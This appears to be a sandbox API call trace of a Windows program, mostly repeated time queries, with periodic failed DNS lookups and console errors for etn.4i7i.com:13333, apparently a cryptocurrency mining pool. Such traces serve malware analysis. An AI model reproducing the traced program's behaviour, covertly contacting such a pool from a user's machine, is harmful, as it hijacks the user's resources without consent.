GetSystemTimeAsFileTime,,0,1542888153.546
GetSystemTimeAsFileTime,,0,1542888153.546
GetSystemTimeAsFileTime,,0,1542888153.687
GetSystemTimeAsFileTime,,0,1542888153.89
GetSystemTimeAsFileTime,,0,1542888154.046
GetSystemTimeAsFileTime,,0,1542888154.046
GetSystemTimeAsFileTime,,0,1542888154.046
GetSystemTimeAsFileTime,,0,1542888154.046
GetSystemTimeAsFileTime,,0,1542888154.046
GetSystemTimeAsFileTime,,0,1542888154.046
GetSystemTimeAsFileTime,,0,1542888154.093
GetSystemTimeAsFileTime,,0,1542888154.296
GetSystemTimeAsFileTime,,0,1542888154.5
GetSystemTimeAsFileTime,,0,1542888154.562
GetSystemTimeAsFileTime,,0,1542888154.562
GetSystemTimeAsFileTime,,0,1542888154.562
GetSystemTimeAsFileTime,,0,1542888154.562
GetSystemTimeAsFileTime,,0,1542888154.562
GetSystemTimeAsFileTime,,0,1542888154.562
GetSystemTimeAsFileTime,,0,1542888154.703
GetSystemTimeAsFileTime,,0,1542888154.906
GetSystemTimeAsFileTime,,0,1542888155.062
GetSystemTimeAsFileTime,,0,1542888155.062
GetSystemTimeAsFileTime,,0,1542888155.062
GetSystemTimeAsFileTime,,0,1542888155.062
GetSystemTimeAsFileTime,,0,1542888155.062
GetSystemTimeAsFileTime,,0,1542888155.062
GetSystemTimeAsFileTime,,0,1542888155.109
GetSystemTimeAsFileTime,,0,1542888155.312
GetSystemTimeAsFileTime,,0,1542888155.515
GetSystemTimeAsFileTime,,0,1542888155.562
GetSystemTimeAsFileTime,,0,1542888155.562
GetSystemTimeAsFileTime,,0,1542888155.562
GetSystemTimeAsFileTime,,0,1542888155.562
GetSystemTimeAsFileTime,,0,1542888155.562
GetSystemTimeAsFileTime,,0,1542888155.562
GetSystemTimeAsFileTime,,0,1542888155.718
GetSystemTimeAsFileTime,,0,1542888155.921
GetSystemTimeAsFileTime,,0,1542888156.078
GetSystemTimeAsFileTime,,0,1542888156.078
GetSystemTimeAsFileTime,,0,1542888156.078
GetSystemTimeAsFileTime,,0,1542888156.078
GetSystemTimeAsFileTime,,0,1542888156.078
GetSystemTimeAsFileTime,,0,1542888156.078
GetSystemTimeAsFileTime,,0,1542888156.125
GetSystemTimeAsFileTime,,0,1542888156.328
GetSystemTimeAsFileTime,,0,1542888156.531
GetSystemTimeAsFileTime,,0,1542888156.593
GetSystemTimeAsFileTime,,0,1542888156.593
GetSystemTimeAsFileTime,,0,1542888156.593
GetSystemTimeAsFileTime,,0,1542888156.593
GetSystemTimeAsFileTime,,0,1542888156.593
GetSystemTimeAsFileTime,,0,1542888156.593
GetSystemTimeAsFileTime,,0,1542888156.734
GetSystemTimeAsFileTime,,0,1542888156.937
GetSystemTimeAsFileTime,,0,1542888157.093
GetSystemTimeAsFileTime,,0,1542888157.093
GetSystemTimeAsFileTime,,0,1542888157.093
GetSystemTimeAsFileTime,,0,1542888157.093
GetSystemTimeAsFileTime,,0,1542888157.093
GetSystemTimeAsFileTime,,0,1542888157.093
GetSystemTimeAsFileTime,,0,1542888157.14
GetSystemTimeAsFileTime,,0,1542888157.343
GetSystemTimeAsFileTime,,0,1542888157.546
GetSystemTimeAsFileTime,,0,1542888157.593
GetSystemTimeAsFileTime,,0,1542888157.593
GetSystemTimeAsFileTime,,0,1542888157.593
GetSystemTimeAsFileTime,,0,1542888157.593
GetSystemTimeAsFileTime,,0,1542888157.593
GetSystemTimeAsFileTime,,0,1542888157.593
GetSystemTimeAsFileTime,,0,1542888157.75
GetSystemTimeAsFileTime,,0,1542888157.953
GetSystemTimeAsFileTime,,0,1542888158.093
GetSystemTimeAsFileTime,,0,1542888158.093
GetSystemTimeAsFileTime,,0,1542888158.093
GetSystemTimeAsFileTime,,0,1542888158.093
GetSystemTimeAsFileTime,,0,1542888158.093
GetSystemTimeAsFileTime,,0,1542888158.093
GetSystemTimeAsFileTime,,0,1542888158.156
GetSystemTimeAsFileTime,,0,1542888158.359
GetSystemTimeAsFileTime,,0,1542888158.562
GetSystemTimeAsFileTime,,0,1542888158.593
GetSystemTimeAsFileTime,,0,1542888158.593
GetSystemTimeAsFileTime,,0,1542888158.593
GetSystemTimeAsFileTime,,0,1542888158.593
GetSystemTimeAsFileTime,,0,1542888158.593
GetSystemTimeAsFileTime,,0,1542888158.593
GetSystemTimeAsFileTime,,0,1542888158.765
GetSystemTimeAsFileTime,,0,1542888158.968
GetAddrInfoW,etn.4i7i.com#,11001,1542888158.984
GetSystemTimeAsFileTime,,0,1542888158.984
GetFileType,0x00000007,2,1542888158.984
WriteConsoleW,[2018-11-22 21:42:38]#0x0000000f,1,1542888158.984
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888158.984
GetSystemTimeAsFileTime,,0,1542888159.109
GetSystemTimeAsFileTime,,0,1542888159.109
GetSystemTimeAsFileTime,,0,1542888159.109
GetSystemTimeAsFileTime,,0,1542888159.109
GetSystemTimeAsFileTime,,0,1542888159.109
GetSystemTimeAsFileTime,,0,1542888159.109
GetSystemTimeAsFileTime,,0,1542888159.171
GetSystemTimeAsFileTime,,0,1542888159.375
GetSystemTimeAsFileTime,,0,1542888159.578
GetSystemTimeAsFileTime,,0,1542888159.609
GetSystemTimeAsFileTime,,0,1542888159.609
GetSystemTimeAsFileTime,,0,1542888159.609
GetSystemTimeAsFileTime,,0,1542888159.609
GetSystemTimeAsFileTime,,0,1542888159.609
GetSystemTimeAsFileTime,,0,1542888159.609
GetSystemTimeAsFileTime,,0,1542888159.781
GetSystemTimeAsFileTime,,0,1542888159.984
GetSystemTimeAsFileTime,,0,1542888160.109
GetSystemTimeAsFileTime,,0,1542888160.109
GetSystemTimeAsFileTime,,0,1542888160.109
GetSystemTimeAsFileTime,,0,1542888160.109
GetSystemTimeAsFileTime,,0,1542888160.109
GetSystemTimeAsFileTime,,0,1542888160.109
GetSystemTimeAsFileTime,,0,1542888160.187
GetSystemTimeAsFileTime,,0,1542888160.39
GetSystemTimeAsFileTime,,0,1542888160.593
GetSystemTimeAsFileTime,,0,1542888160.625
GetSystemTimeAsFileTime,,0,1542888160.625
GetSystemTimeAsFileTime,,0,1542888160.625
GetSystemTimeAsFileTime,,0,1542888160.625
GetSystemTimeAsFileTime,,0,1542888160.625
GetSystemTimeAsFileTime,,0,1542888160.625
GetSystemTimeAsFileTime,,0,1542888160.796
GetSystemTimeAsFileTime,,0,1542888161.0
GetSystemTimeAsFileTime,,0,1542888161.125
GetSystemTimeAsFileTime,,0,1542888161.125
GetSystemTimeAsFileTime,,0,1542888161.125
GetSystemTimeAsFileTime,,0,1542888161.125
GetSystemTimeAsFileTime,,0,1542888161.125
GetSystemTimeAsFileTime,,0,1542888161.125
GetSystemTimeAsFileTime,,0,1542888161.203
GetSystemTimeAsFileTime,,0,1542888161.406
GetSystemTimeAsFileTime,,0,1542888161.609
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.64
GetSystemTimeAsFileTime,,0,1542888161.812
GetSystemTimeAsFileTime,,0,1542888162.015
GetSystemTimeAsFileTime,,0,1542888162.156
GetSystemTimeAsFileTime,,0,1542888162.156
GetSystemTimeAsFileTime,,0,1542888162.156
GetSystemTimeAsFileTime,,0,1542888162.156
GetSystemTimeAsFileTime,,0,1542888162.156
GetSystemTimeAsFileTime,,0,1542888162.156
GetSystemTimeAsFileTime,,0,1542888162.218
GetSystemTimeAsFileTime,,0,1542888162.421
GetSystemTimeAsFileTime,,0,1542888162.625
GetSystemTimeAsFileTime,,0,1542888162.656
GetSystemTimeAsFileTime,,0,1542888162.656
GetSystemTimeAsFileTime,,0,1542888162.656
GetSystemTimeAsFileTime,,0,1542888162.656
GetSystemTimeAsFileTime,,0,1542888162.656
GetSystemTimeAsFileTime,,0,1542888162.656
GetSystemTimeAsFileTime,,0,1542888162.828
GetSystemTimeAsFileTime,,0,1542888163.031
GetSystemTimeAsFileTime,,0,1542888163.171
GetSystemTimeAsFileTime,,0,1542888163.171
GetSystemTimeAsFileTime,,0,1542888163.171
GetSystemTimeAsFileTime,,0,1542888163.171
GetSystemTimeAsFileTime,,0,1542888163.171
GetSystemTimeAsFileTime,,0,1542888163.171
GetSystemTimeAsFileTime,,0,1542888163.234
GetSystemTimeAsFileTime,,0,1542888163.437
GetSystemTimeAsFileTime,,0,1542888163.64
GetSystemTimeAsFileTime,,0,1542888163.671
GetSystemTimeAsFileTime,,0,1542888163.671
GetSystemTimeAsFileTime,,0,1542888163.671
GetSystemTimeAsFileTime,,0,1542888163.671
GetSystemTimeAsFileTime,,0,1542888163.671
GetSystemTimeAsFileTime,,0,1542888163.671
GetSystemTimeAsFileTime,,0,1542888163.843
GetSystemTimeAsFileTime,,0,1542888164.046
GetSystemTimeAsFileTime,,0,1542888164.187
GetSystemTimeAsFileTime,,0,1542888164.187
GetSystemTimeAsFileTime,,0,1542888164.187
GetSystemTimeAsFileTime,,0,1542888164.187
GetSystemTimeAsFileTime,,0,1542888164.187
GetSystemTimeAsFileTime,,0,1542888164.187
GetSystemTimeAsFileTime,,0,1542888164.25
GetSystemTimeAsFileTime,,0,1542888164.453
GetSystemTimeAsFileTime,,0,1542888164.656
GetSystemTimeAsFileTime,,0,1542888164.687
GetSystemTimeAsFileTime,,0,1542888164.687
GetSystemTimeAsFileTime,,0,1542888164.687
GetSystemTimeAsFileTime,,0,1542888164.687
GetSystemTimeAsFileTime,,0,1542888164.687
GetSystemTimeAsFileTime,,0,1542888164.687
GetSystemTimeAsFileTime,,0,1542888164.859
GetSystemTimeAsFileTime,,0,1542888165.062
GetSystemTimeAsFileTime,,0,1542888165.203
GetSystemTimeAsFileTime,,0,1542888165.203
GetSystemTimeAsFileTime,,0,1542888165.203
GetSystemTimeAsFileTime,,0,1542888165.203
GetSystemTimeAsFileTime,,0,1542888165.203
GetSystemTimeAsFileTime,,0,1542888165.203
GetSystemTimeAsFileTime,,0,1542888165.265
GetSystemTimeAsFileTime,,0,1542888165.468
GetSystemTimeAsFileTime,,0,1542888165.671
GetSystemTimeAsFileTime,,0,1542888165.703
GetSystemTimeAsFileTime,,0,1542888165.703
GetSystemTimeAsFileTime,,0,1542888165.703
GetSystemTimeAsFileTime,,0,1542888165.703
GetSystemTimeAsFileTime,,0,1542888165.703
GetSystemTimeAsFileTime,,0,1542888165.703
GetSystemTimeAsFileTime,,0,1542888165.875
GetSystemTimeAsFileTime,,0,1542888166.078
GetSystemTimeAsFileTime,,0,1542888166.218
GetSystemTimeAsFileTime,,0,1542888166.218
GetSystemTimeAsFileTime,,0,1542888166.218
GetSystemTimeAsFileTime,,0,1542888166.218
GetSystemTimeAsFileTime,,0,1542888166.218
GetSystemTimeAsFileTime,,0,1542888166.218
GetSystemTimeAsFileTime,,0,1542888166.281
GetSystemTimeAsFileTime,,0,1542888166.484
GetSystemTimeAsFileTime,,0,1542888166.687
GetSystemTimeAsFileTime,,0,1542888166.718
GetSystemTimeAsFileTime,,0,1542888166.718
GetSystemTimeAsFileTime,,0,1542888166.718
GetSystemTimeAsFileTime,,0,1542888166.718
GetSystemTimeAsFileTime,,0,1542888166.718
GetSystemTimeAsFileTime,,0,1542888166.718
GetSystemTimeAsFileTime,,0,1542888166.89
GetAddrInfoW,etn.4i7i.com#,11001,1542888167.062
GetSystemTimeAsFileTime,,0,1542888167.062
GetFileType,0x00000007,2,1542888167.062
WriteConsoleW,[2018-11-22 21:42:47]#0x0000000f,1,1542888167.062
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888167.062
GetSystemTimeAsFileTime,,0,1542888167.093
GetSystemTimeAsFileTime,,0,1542888167.218
GetSystemTimeAsFileTime,,0,1542888167.218
GetSystemTimeAsFileTime,,0,1542888167.218
GetSystemTimeAsFileTime,,0,1542888167.218
GetSystemTimeAsFileTime,,0,1542888167.218
GetSystemTimeAsFileTime,,0,1542888167.218
GetSystemTimeAsFileTime,,0,1542888167.296
GetSystemTimeAsFileTime,,0,1542888167.5
GetSystemTimeAsFileTime,,0,1542888167.703
GetSystemTimeAsFileTime,,0,1542888167.734
GetSystemTimeAsFileTime,,0,1542888167.734
GetSystemTimeAsFileTime,,0,1542888167.734
GetSystemTimeAsFileTime,,0,1542888167.734
GetSystemTimeAsFileTime,,0,1542888167.734
GetSystemTimeAsFileTime,,0,1542888167.734
GetSystemTimeAsFileTime,,0,1542888167.906
GetSystemTimeAsFileTime,,0,1542888168.109
GetSystemTimeAsFileTime,,0,1542888168.234
GetSystemTimeAsFileTime,,0,1542888168.234
GetSystemTimeAsFileTime,,0,1542888168.234
GetSystemTimeAsFileTime,,0,1542888168.234
GetSystemTimeAsFileTime,,0,1542888168.234
GetSystemTimeAsFileTime,,0,1542888168.234
GetSystemTimeAsFileTime,,0,1542888168.312
GetSystemTimeAsFileTime,,0,1542888168.515
GetSystemTimeAsFileTime,,0,1542888168.718
GetSystemTimeAsFileTime,,0,1542888168.734
GetSystemTimeAsFileTime,,0,1542888168.734
GetSystemTimeAsFileTime,,0,1542888168.734
GetSystemTimeAsFileTime,,0,1542888168.734
GetSystemTimeAsFileTime,,0,1542888168.734
GetSystemTimeAsFileTime,,0,1542888168.734
GetSystemTimeAsFileTime,,0,1542888168.921
GetSystemTimeAsFileTime,,0,1542888169.125
GetSystemTimeAsFileTime,,0,1542888169.25
GetSystemTimeAsFileTime,,0,1542888169.25
GetSystemTimeAsFileTime,,0,1542888169.25
GetSystemTimeAsFileTime,,0,1542888169.25
GetSystemTimeAsFileTime,,0,1542888169.25
GetSystemTimeAsFileTime,,0,1542888169.25
GetSystemTimeAsFileTime,,0,1542888169.328
GetSystemTimeAsFileTime,,0,1542888169.531
GetSystemTimeAsFileTime,,0,1542888169.734
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.75
GetSystemTimeAsFileTime,,0,1542888169.937
GetSystemTimeAsFileTime,,0,1542888170.14
GetSystemTimeAsFileTime,,0,1542888170.265
GetSystemTimeAsFileTime,,0,1542888170.265
GetSystemTimeAsFileTime,,0,1542888170.265
GetSystemTimeAsFileTime,,0,1542888170.265
GetSystemTimeAsFileTime,,0,1542888170.265
GetSystemTimeAsFileTime,,0,1542888170.265
GetSystemTimeAsFileTime,,0,1542888170.343
GetSystemTimeAsFileTime,,0,1542888170.546
GetSystemTimeAsFileTime,,0,1542888170.75
GetSystemTimeAsFileTime,,0,1542888170.765
GetSystemTimeAsFileTime,,0,1542888170.765
GetSystemTimeAsFileTime,,0,1542888170.765
GetSystemTimeAsFileTime,,0,1542888170.765
GetSystemTimeAsFileTime,,0,1542888170.765
GetSystemTimeAsFileTime,,0,1542888170.765
GetSystemTimeAsFileTime,,0,1542888170.953
GetSystemTimeAsFileTime,,0,1542888171.156
GetSystemTimeAsFileTime,,0,1542888171.265
GetSystemTimeAsFileTime,,0,1542888171.265
GetSystemTimeAsFileTime,,0,1542888171.265
GetSystemTimeAsFileTime,,0,1542888171.265
GetSystemTimeAsFileTime,,0,1542888171.265
GetSystemTimeAsFileTime,,0,1542888171.265
GetSystemTimeAsFileTime,,0,1542888171.359
GetSystemTimeAsFileTime,,0,1542888171.562
NtClose,0x00000210,0,1542888171.75
NtClose,0x00000214,0,1542888171.75
GetSystemTimeAsFileTime,,0,1542888171.765
GetSystemTimeAsFileTime,,0,1542888171.781
GetSystemTimeAsFileTime,,0,1542888171.781
GetSystemTimeAsFileTime,,0,1542888171.781
GetSystemTimeAsFileTime,,0,1542888171.781
GetSystemTimeAsFileTime,,0,1542888171.781
GetSystemTimeAsFileTime,,0,1542888171.781
GetSystemTimeAsFileTime,,0,1542888171.968
GetSystemTimeAsFileTime,,0,1542888172.171
GetSystemTimeAsFileTime,,0,1542888172.281
GetSystemTimeAsFileTime,,0,1542888172.281
GetSystemTimeAsFileTime,,0,1542888172.281
GetSystemTimeAsFileTime,,0,1542888172.281
GetSystemTimeAsFileTime,,0,1542888172.281
GetSystemTimeAsFileTime,,0,1542888172.281
GetSystemTimeAsFileTime,,0,1542888172.375
GetSystemTimeAsFileTime,,0,1542888172.578
GetSystemTimeAsFileTime,,0,1542888172.781
GetSystemTimeAsFileTime,,0,1542888172.796
GetSystemTimeAsFileTime,,0,1542888172.796
GetSystemTimeAsFileTime,,0,1542888172.796
GetSystemTimeAsFileTime,,0,1542888172.796
GetSystemTimeAsFileTime,,0,1542888172.796
GetSystemTimeAsFileTime,,0,1542888172.796
GetSystemTimeAsFileTime,,0,1542888172.984
GetSystemTimeAsFileTime,,0,1542888173.187
GetSystemTimeAsFileTime,,0,1542888173.296
GetSystemTimeAsFileTime,,0,1542888173.296
GetSystemTimeAsFileTime,,0,1542888173.296
GetSystemTimeAsFileTime,,0,1542888173.296
GetSystemTimeAsFileTime,,0,1542888173.296
GetSystemTimeAsFileTime,,0,1542888173.296
GetSystemTimeAsFileTime,,0,1542888173.39
GetSystemTimeAsFileTime,,0,1542888173.593
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888173.796
GetSystemTimeAsFileTime,,0,1542888174.0
GetSystemTimeAsFileTime,,0,1542888174.203
GetSystemTimeAsFileTime,,0,1542888174.312
GetSystemTimeAsFileTime,,0,1542888174.312
GetSystemTimeAsFileTime,,0,1542888174.312
GetSystemTimeAsFileTime,,0,1542888174.312
GetSystemTimeAsFileTime,,0,1542888174.312
GetSystemTimeAsFileTime,,0,1542888174.312
GetSystemTimeAsFileTime,,0,1542888174.406
GetSystemTimeAsFileTime,,0,1542888174.609
GetSystemTimeAsFileTime,,0,1542888174.812
GetSystemTimeAsFileTime,,0,1542888174.828
GetSystemTimeAsFileTime,,0,1542888174.828
GetSystemTimeAsFileTime,,0,1542888174.828
GetSystemTimeAsFileTime,,0,1542888174.828
GetSystemTimeAsFileTime,,0,1542888174.828
GetSystemTimeAsFileTime,,0,1542888174.828
GetSystemTimeAsFileTime,,0,1542888175.015
GetAddrInfoW,etn.4i7i.com#,11001,1542888175.156
GetSystemTimeAsFileTime,,0,1542888175.156
GetFileType,0x00000007,2,1542888175.156
WriteConsoleW,[2018-11-22 21:42:55]#0x0000000f,1,1542888175.156
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888175.156
GetSystemTimeAsFileTime,,0,1542888175.218
GetSystemTimeAsFileTime,,0,1542888175.343
GetSystemTimeAsFileTime,,0,1542888175.343
GetSystemTimeAsFileTime,,0,1542888175.343
GetSystemTimeAsFileTime,,0,1542888175.343
GetSystemTimeAsFileTime,,0,1542888175.343
GetSystemTimeAsFileTime,,0,1542888175.343
GetSystemTimeAsFileTime,,0,1542888175.421
GetSystemTimeAsFileTime,,0,1542888175.625
GetSystemTimeAsFileTime,,0,1542888175.828
GetSystemTimeAsFileTime,,0,1542888175.859
GetSystemTimeAsFileTime,,0,1542888175.859
GetSystemTimeAsFileTime,,0,1542888175.859
GetSystemTimeAsFileTime,,0,1542888175.859
GetSystemTimeAsFileTime,,0,1542888175.859
GetSystemTimeAsFileTime,,0,1542888175.859
GetSystemTimeAsFileTime,,0,1542888176.031
GetSystemTimeAsFileTime,,0,1542888176.234
GetSystemTimeAsFileTime,,0,1542888176.359
GetSystemTimeAsFileTime,,0,1542888176.359
GetSystemTimeAsFileTime,,0,1542888176.359
GetSystemTimeAsFileTime,,0,1542888176.359
GetSystemTimeAsFileTime,,0,1542888176.359
GetSystemTimeAsFileTime,,0,1542888176.359
GetSystemTimeAsFileTime,,0,1542888176.437
GetSystemTimeAsFileTime,,0,1542888176.64
GetSystemTimeAsFileTime,,0,1542888176.843
GetSystemTimeAsFileTime,,0,1542888177.046
GetSystemTimeAsFileTime,,0,1542888177.25
GetSystemTimeAsFileTime,,0,1542888177.453
GetSystemTimeAsFileTime,,0,1542888177.484
GetSystemTimeAsFileTime,,0,1542888177.484
GetSystemTimeAsFileTime,,0,1542888177.484
GetSystemTimeAsFileTime,,0,1542888177.484
GetSystemTimeAsFileTime,,0,1542888177.484
GetSystemTimeAsFileTime,,0,1542888177.484
GetSystemTimeAsFileTime,,0,1542888177.656
GetSystemTimeAsFileTime,,0,1542888177.859
GetSystemTimeAsFileTime,,0,1542888178.062
GetSystemTimeAsFileTime,,0,1542888178.093
GetSystemTimeAsFileTime,,0,1542888178.093
GetSystemTimeAsFileTime,,0,1542888178.093
GetSystemTimeAsFileTime,,0,1542888178.093
GetSystemTimeAsFileTime,,0,1542888178.093
GetSystemTimeAsFileTime,,0,1542888178.093
GetSystemTimeAsFileTime,,0,1542888178.265
GetSystemTimeAsFileTime,,0,1542888178.468
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.593
GetSystemTimeAsFileTime,,0,1542888178.671
GetSystemTimeAsFileTime,,0,1542888178.875
GetSystemTimeAsFileTime,,0,1542888179.078
GetSystemTimeAsFileTime,,0,1542888179.109
GetSystemTimeAsFileTime,,0,1542888179.109
GetSystemTimeAsFileTime,,0,1542888179.109
GetSystemTimeAsFileTime,,0,1542888179.109
GetSystemTimeAsFileTime,,0,1542888179.109
GetSystemTimeAsFileTime,,0,1542888179.109
GetSystemTimeAsFileTime,,0,1542888179.281
GetSystemTimeAsFileTime,,0,1542888179.484
GetSystemTimeAsFileTime,,0,1542888179.609
GetSystemTimeAsFileTime,,0,1542888179.609
GetSystemTimeAsFileTime,,0,1542888179.609
GetSystemTimeAsFileTime,,0,1542888179.609
GetSystemTimeAsFileTime,,0,1542888179.609
GetSystemTimeAsFileTime,,0,1542888179.609
GetSystemTimeAsFileTime,,0,1542888179.687
GetSystemTimeAsFileTime,,0,1542888179.89
GetSystemTimeAsFileTime,,0,1542888180.093
GetSystemTimeAsFileTime,,0,1542888180.109
GetSystemTimeAsFileTime,,0,1542888180.109
GetSystemTimeAsFileTime,,0,1542888180.109
GetSystemTimeAsFileTime,,0,1542888180.109
GetSystemTimeAsFileTime,,0,1542888180.109
GetSystemTimeAsFileTime,,0,1542888180.109
GetSystemTimeAsFileTime,,0,1542888180.296
GetSystemTimeAsFileTime,,0,1542888180.5
GetSystemTimeAsFileTime,,0,1542888180.625
GetSystemTimeAsFileTime,,0,1542888180.625
GetSystemTimeAsFileTime,,0,1542888180.625
GetSystemTimeAsFileTime,,0,1542888180.625
GetSystemTimeAsFileTime,,0,1542888180.625
GetSystemTimeAsFileTime,,0,1542888180.625
GetSystemTimeAsFileTime,,0,1542888180.703
GetSystemTimeAsFileTime,,0,1542888180.906
GetSystemTimeAsFileTime,,0,1542888181.109
GetSystemTimeAsFileTime,,0,1542888181.14
GetSystemTimeAsFileTime,,0,1542888181.14
GetSystemTimeAsFileTime,,0,1542888181.14
GetSystemTimeAsFileTime,,0,1542888181.14
GetSystemTimeAsFileTime,,0,1542888181.14
GetSystemTimeAsFileTime,,0,1542888181.14
GetSystemTimeAsFileTime,,0,1542888181.312
GetSystemTimeAsFileTime,,0,1542888181.515
GetSystemTimeAsFileTime,,0,1542888181.656
GetSystemTimeAsFileTime,,0,1542888181.656
GetSystemTimeAsFileTime,,0,1542888181.656
GetSystemTimeAsFileTime,,0,1542888181.656
GetSystemTimeAsFileTime,,0,1542888181.656
GetSystemTimeAsFileTime,,0,1542888181.656
GetSystemTimeAsFileTime,,0,1542888181.718
GetSystemTimeAsFileTime,,0,1542888181.921
GetSystemTimeAsFileTime,,0,1542888182.125
GetSystemTimeAsFileTime,,0,1542888182.156
GetSystemTimeAsFileTime,,0,1542888182.156
GetSystemTimeAsFileTime,,0,1542888182.156
GetSystemTimeAsFileTime,,0,1542888182.156
GetSystemTimeAsFileTime,,0,1542888182.156
GetSystemTimeAsFileTime,,0,1542888182.156
GetSystemTimeAsFileTime,,0,1542888182.328
GetSystemTimeAsFileTime,,0,1542888182.531
GetSystemTimeAsFileTime,,0,1542888182.671
GetSystemTimeAsFileTime,,0,1542888182.671
GetSystemTimeAsFileTime,,0,1542888182.671
GetSystemTimeAsFileTime,,0,1542888182.671
GetSystemTimeAsFileTime,,0,1542888182.671
GetSystemTimeAsFileTime,,0,1542888182.671
GetSystemTimeAsFileTime,,0,1542888182.734
GetSystemTimeAsFileTime,,0,1542888182.937
GetSystemTimeAsFileTime,,0,1542888183.14
GetSystemTimeAsFileTime,,0,1542888183.187
GetSystemTimeAsFileTime,,0,1542888183.187
GetSystemTimeAsFileTime,,0,1542888183.187
GetSystemTimeAsFileTime,,0,1542888183.187
GetSystemTimeAsFileTime,,0,1542888183.187
GetSystemTimeAsFileTime,,0,1542888183.187
GetSystemTimeAsFileTime,,0,1542888183.343
GetAddrInfoW,etn.4i7i.com#,11001,1542888183.375
GetSystemTimeAsFileTime,,0,1542888183.375
GetFileType,0x00000007,2,1542888183.375
WriteConsoleW,[2018-11-22 21:43:03]#0x0000000f,1,1542888183.375
WriteConsoleW," [etn.4i7i.com:13333] DNS error: ""unknown node or service""#0x0000000f",1,1542888183.375
GetSystemTimeAsFileTime,,0,1542888183.546
GetSystemTimeAsFileTime,,0,1542888183.687
GetSystemTimeAsFileTime,,0,1542888183.687
GetSystemTimeAsFileTime,,0,1542888183.687
GetSystemTimeAsFileTime,,0,1542888183.687
GetSystemTimeAsFileTime,,0,1542888183.687
GetSystemTimeAsFileTime,,0,1542888183.687
GetSystemTimeAsFileTime,,0,1542888183.75
GetSystemTimeAsFileTime,,0,1542888183.953
GetSystemTimeAsFileTime,,0,1542888184.156
GetSystemTimeAsFileTime,,0,1542888184.187
GetSystemTimeAsFileTime,,0,1542888184.187
GetSystemTimeAsFileTime,,0,1542888184.187
GetSystemTimeAsFileTime,,0,1542888184.187
GetSystemTimeAsFileTime,,0,1542888184.187
GetSystemTimeAsFileTime,,0,1542888184.187
GetSystemTimeAsFileTime,,0,1542888184.359
GetSystemTimeAsFileTime,,0,1542888184.562
GetSystemTimeAsFileTime,,0,1542888184.687
GetSystemTimeAsFileTime,,0,1542888184.687
GetSystemTimeAsFileTime,,0,1542888184.687
GetSystemTimeAsFileTime,,0,1542888184.687
GetSystemTimeAsFileTime,,0,1542888184.687
GetSystemTimeAsFileTime,,0,1542888184.687
GetSystemTimeAsFileTime,,0,1542888184.765
GetSystemTimeAsFileTime,,0,1542888184.968
GetSystemTimeAsFileTime,,0,1542888185.171
GetSystemTimeAsFileTime,,0,1542888185.203
GetSystemTimeAsFileTime,,0,1542888185.203
GetSystemTimeAsFileTime,,0,1542888185.203
GetSystemTimeAsFileTime,,0,1542888185.203
GetSystemTimeAsFileTime,,0,1542888185.203
GetSystemTimeAsFileTime,,0,1542888185.203
GetSystemTimeAsFileTime,,0,1542888185.375
GetSystemTimeAsFileTime,,0,1542888185.578
GetSystemTimeAsFileTime,,0,1542888185.718
GetSystemTimeAsFileTime,,0,1542888185.718
GetSystemTimeAsFileTime,,0,1542888185.718
GetSystemTimeAsFileTime,,0,1542888185.718
GetSystemTimeAsFileTime,,0,1542888185.718
GetSystemTimeAsFileTime,,0,1542888185.718
GetSystemTimeAsFileTime,,0,1542888185.781
GetSystemTimeAsFileTime,,0,1542888185.984
GetSystemTimeAsFileTime,,0,1542888186.187
GetSystemTimeAsFileTime,,0,1542888186.218
GetSystemTimeAsFileTime,,0,1542888186.218
GetSystemTimeAsFileTime,,0,1542888186.218
GetSystemTimeAsFileTime,,0,1542888186.218
GetSystemTimeAsFileTime,,0,1542888186.218
GetSystemTimeAsFileTime,,0,1542888186.218
GetSystemTimeAsFileTime,,0,1542888186.39
GetSystemTimeAsFileTime,,0,1542888186.593
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.734
GetSystemTimeAsFileTime,,0,1542888186.796
GetSystemTimeAsFileTime,,0,1542888187.0
GetSystemTimeAsFileTime,,0,1542888187.203
GetSystemTimeAsFileTime,,0,1542888187.234
GetSystemTimeAsFileTime,,0,1542888187.234
GetSystemTimeAsFileTime,,0,1542888187.234
GetSystemTimeAsFileTime,,0,1542888187.234
GetSystemTimeAsFileTime,,0,1542888187.234
GetSystemTimeAsFileTime,,0,1542888187.234
GetSystemTimeAsFileTime,,0,1542888187.406
GetSystemTimeAsFileTime,,0,1542888187.609
GetSystemTimeAsFileTime,,0,1542888187.75
GetSystemTimeAsFileTime,,0,1542888187.75
GetSystemTimeAsFileTime,,0,1542888187.75
GetSystemTimeAsFileTime,,0,1542888187.75
GetSystemTimeAsFileTime,,0,1542888187.75
GetSystemTimeAsFileTime,,0,1542888187.75
GetSystemTimeAsFileTime,,0,1542888187.812
